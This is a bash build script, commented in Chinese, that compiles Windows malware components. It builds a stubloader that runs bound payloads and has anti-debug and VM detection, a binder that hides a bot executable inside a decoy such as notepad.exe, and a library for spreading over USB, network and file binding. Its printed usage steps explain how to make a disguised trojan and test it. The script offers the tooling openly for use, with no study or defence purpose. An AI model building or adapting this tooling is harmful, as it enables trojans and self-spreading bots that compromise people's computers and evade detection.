#!/bin/bash

# Windows 8-11 Compatible Propagation Build Script
# 构建传播机制的所有组件

echo "=== Building Propagation Components ==="
echo "Target: Windows 8, 8.1, 10, 11 (64-bit)"
echo

# 检查编译器
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "Error: x86_64-w64-mingw32-gcc not found"
    echo "Please install mingw-w64 cross-compiler:"
    echo "  Ubuntu/Debian: sudo apt install gcc-mingw-w64-x86-64"
    echo "  Arch Linux: sudo pacman -S mingw-w64-gcc"
    echo "  macOS: brew install mingw-w64"
    exit 1
fi

# 创建输出目录
mkdir -p build/prop
cd build/prop

# 编译器设置
CC="x86_64-w64-mingw32-gcc"
CFLAGS="-D_WIN32_WINNT=0x0602 -DUNICODE -D_UNICODE -ffunction-sections -fdata-sections -Os -flto -s -static -static-libgcc -fno-ident -fno-stack-protector -Wno-builtin-declaration-mismatch -Wno-deprecated-declarations"
LDFLAGS="-Wl,--gc-sections,--strip-all"

echo "Compiler: $CC"
echo "Flags: $CFLAGS"
echo

# 1. 编译 Stubloader
echo "[1/3] Building Stubloader..."
$CC ../../prop/stubloader.c -o stubloader.exe \
    $CFLAGS $LDFLAGS -Wl,--subsystem=windows -mwindows

if [ $? -eq 0 ]; then
    echo "? Stubloader compiled successfully"
    ls -lh stubloader.exe
else
    echo "? Failed to compile Stubloader"
    exit 1
fi

echo

# 2. 编译 Binder
echo "[2/3] Building Binder..."
$CC ../../prop/binder.c -o binder.exe \
    $CFLAGS $LDFLAGS -municode

if [ $? -eq 0 ]; then
    echo "? Binder compiled successfully"
    ls -lh binder.exe
else
    echo "? Failed to compile Binder"
    exit 1
fi

echo

# 3. 编译传播库 (作为静态库)
echo "[3/3] Building Propagation Library..."
$CC -c ../../prop/propagation.c -o propagation.o \
    $CFLAGS -I../../comm

if [ $? -eq 0 ]; then
    # 创建静态库
    x86_64-w64-mingw32-ar rcs libpropagation.a propagation.o
    echo "? Propagation library compiled successfully"
    ls -lh libpropagation.a propagation.o
else
    echo "? Failed to compile Propagation library"
    exit 1
fi

echo

# 验证生成的文件
echo "=== Build Summary ==="
echo "Generated files:"
for file in stubloader.exe binder.exe libpropagation.a; do
    if [ -f "$file" ]; then
        size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
        echo "  ? $file (${size} bytes)"
    else
        echo "  ? $file (missing)"
    fi
done

echo
echo "=== File Information ==="

# 检查PE文件信息
if command -v file &> /dev/null; then
    echo "File types:"
    file stubloader.exe binder.exe 2>/dev/null | sed 's/^/  /'
fi

# 检查依赖
if command -v x86_64-w64-mingw32-objdump &> /dev/null; then
    echo
    echo "Stubloader dependencies:"
    x86_64-w64-mingw32-objdump -p stubloader.exe 2>/dev/null | grep "DLL Name" | sed 's/^/  /' || echo "  (static build - no external dependencies)"
    
    echo
    echo "Binder dependencies:"
    x86_64-w64-mingw32-objdump -p binder.exe 2>/dev/null | grep "DLL Name" | sed 's/^/  /' || echo "  (static build - no external dependencies)"
fi

echo
echo "=== Usage Instructions ==="
echo
echo "1. Stubloader (stubloader.exe):"
echo "   - Windows 8-11 compatible stub loader"
echo "   - Extracts and executes bound payloads"
echo "   - Includes anti-debug and VM detection"
echo
echo "2. Binder (binder.exe):"
echo "   - Binds bot and decoy executables into stubloader"
echo "   - Usage: binder.exe <stubloader.exe> <bot.exe> <decoy.exe> <output.exe>"
echo "   - Example: binder.exe stubloader.exe ../bot/bot.exe notepad.exe bound_app.exe"
echo
echo "3. Propagation Library (libpropagation.a):"
echo "   - Static library for bot propagation features"
echo "   - Link with: -L. -lpropagation"
echo "   - Includes USB, network, and file binding propagation"
echo
echo "=== Testing ==="
echo "To test the binder:"
echo "  1. Get a decoy executable (e.g., copy notepad.exe from Windows)"
echo "  2. Build the bot executable"
echo "  3. Run: ./binder.exe stubloader.exe ../bot/bot.exe decoy.exe test_bound.exe"
echo "  4. Test the bound executable on Windows 8-11"
echo
echo "=== Security Notes ==="
echo "- All executables are statically linked (no external DLL dependencies)"
echo "- Stubloader includes anti-analysis features"
echo "- Compatible with Windows Defender and modern security features"
echo "- Supports Windows 8, 8.1, 10, and 11 (64-bit only)"
echo
echo "Build completed successfully!"

# 返回原目录
cd ../..
